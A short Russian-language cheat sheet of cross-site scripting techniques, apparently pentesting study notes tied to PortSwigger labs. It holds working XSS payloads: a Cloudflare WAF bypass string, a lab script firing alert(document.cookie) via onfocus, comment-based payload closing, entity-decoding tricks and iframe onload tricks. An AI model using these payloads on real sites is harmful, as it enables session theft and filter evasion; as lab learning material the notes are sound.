# Cheat Sheets

Прекрасный cheatsheet от Portswigger по XSS.\
Можно выбрать какие элементы вам доступны, какие действия и пр., отсортировать по типу взаимодействия. А также скопировать все полученные пейлоады по одной кнопке[\
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

`XSS Cloudflare WAF bypass:`\
`<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert1;>`

Тренировочные лабы от Portswigger - [https://portswigger.net/research/documenting-the-impossible-unexploitable-xss-labs](https://portswigger.net/research/documenting-the-impossible-unexploitable-xss-labs)

Полиглоты: [https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)

Есть особый случай: автодополнение тегов: \<strong>test  ->  \<strong>test\</strong>

## Другие особые случаи&#x20;

### Из PortSwigger Labs (XSS)

Перевести фокус на элемент (и тем самым вызвать срабатывание onfocus) через якорь:

```
<script>
location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dtest+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#test';
</script> 
```

Если по каким-то причинам мы не можем закрыть оставшуюся часть полезной нагрузки, то можно закрыть комментарием — `//`. Например: `\'; alert(123); //`.

При обработке HTML-страницы сначала декодится htmlencode, затем уже интерпретируется JS-код. => можно использовать символы `&apos;` и тп, сначала декодируются они.

### iframe usage example

#### Изменить url при отрисовке формы

```markup
<iframe src="https://example.com/" onload="this.src += '#fragment'"></iframe>
```

Откроется iframe `https://example.com/`, после отрисовки формы пользователь будет перенаправлен на `https://example.com/#fragment`.

#### Resize формы при отрисовке формы

```html
<iframe src="https://example.com/?search=" onload="this.style.width='100px'"></iframe>
```

